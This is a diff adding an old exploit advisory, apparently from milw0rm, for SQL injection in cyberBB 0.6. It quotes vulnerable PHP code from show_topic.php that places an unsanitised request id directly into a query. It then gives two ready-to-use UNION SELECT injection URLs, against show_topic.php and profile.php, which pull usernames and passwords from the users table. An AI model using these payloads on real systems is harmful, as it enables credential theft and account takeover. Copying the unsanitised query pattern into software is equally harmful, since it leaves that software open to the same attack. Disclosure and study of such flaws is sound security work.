@@ -1,0 +1,35 @@
+########################################################################################
+#
+#   Name        :   cyberBB v. 0.6 Multiply Remote SQL Injection Vulnerabilities
+#   Author      :   cOndemned [ Dark-Coders ]
+#   Greetz      :   Avantura, str0ke, ZaBeaTy, voo|doo, irk4z, and many, many more...
+#   Conditions  :   Magic quotes gpc = On & Off / User must be logged into 
+#
+########################################################################################
+
+source of /show_topic.php :
+
+    21.     $id=$_REQUEST['id'];
+    22.
+    23.     if(isset($_REQUEST['p'])) $p=$_REQUEST['p']; else $p='';
+    24.
+    25.     $db = mysql_connect($mysql_server,$mysql_user,$mysql_pass);
+    26.
+    27.     mysql_select_db($mysql_db);
+    28.
+    29.     $sql = "SELECT * FROM `topics` WHERE `id` = $id";
+
+
+ proof of concept :
+    
+    /show_topic.php?id=-1+UNION+SELECT+1,2,3,4,concat(username,0x3a,password),6,7+FROM+users/*
+
+
+second sql injection (magic quotes gpc must be off):
+    
+    /profile.php?user='-1+UNION+SELECT+1,2,3,4,5,concat(username,0x3a,password),7,8,9,10,11+FROM+users/*
+
+   
+just 4 fun
+
+# milw0rm.com [2008-08-18]
